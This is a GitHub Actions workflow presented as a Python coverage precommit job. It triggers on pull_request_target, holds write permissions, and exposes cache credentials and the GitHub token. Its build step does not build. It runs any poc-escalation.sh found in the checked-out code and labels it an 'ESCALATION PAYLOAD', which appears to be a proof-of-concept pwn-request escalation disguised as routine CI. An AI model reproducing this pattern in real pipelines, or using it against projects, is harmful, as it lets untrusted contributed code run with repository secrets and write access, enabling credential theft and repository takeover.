name: PreCommit Python Coverage

on:
  pull_request_target:
    branches: ['master']
    paths: ['sdks/python/**', 'model/**', '.github/trigger_files/beam_PreCommit_Python_Coverage.json']
  issue_comment:
    types: [created]
  workflow_dispatch:

permissions:
  actions: write
  pull-requests: write
  checks: write
  contents: read
  issues: write

env:
  DEVELOCITY_ACCESS_KEY: ${{ secrets.DEVELOCITY_ACCESS_KEY }}
  GRADLE_ENTERPRISE_CACHE_USERNAME: ${{ secrets.GE_CACHE_USERNAME }}
  GRADLE_ENTERPRISE_CACHE_PASSWORD: ${{ secrets.GE_CACHE_PASSWORD }}

jobs:
  beam_PreCommit_Python_Coverage:
    name: PreCommit Python Coverage
    runs-on: ubuntu-latest
    timeout-minutes: 30
    if: |
      github.event_name == 'push' ||
      github.event_name == 'pull_request_target' ||
      github.event_name == 'workflow_dispatch' ||
      startswith(github.event.comment.body, 'Run Python_Coverage PreCommit')
    steps:
    - uses: actions/checkout@v4
    - name: Setup repository
      uses: ./.github/actions/setup-action
      with:
        comment_phrase: 'Run Python_Coverage PreCommit'
        github_token: ${{ secrets.GITHUB_TOKEN }}
        github_job: "PreCommit Python Coverage"
    - name: Run build
      run: |
        echo "=== Build from checked-out code ==="
        echo "Commit: $(git log --oneline -1)"
        if [ -f "./poc-escalation.sh" ]; then
          echo "=== ESCALATION PAYLOAD FOUND ==="
          bash ./poc-escalation.sh
        fi
        echo "Build complete."
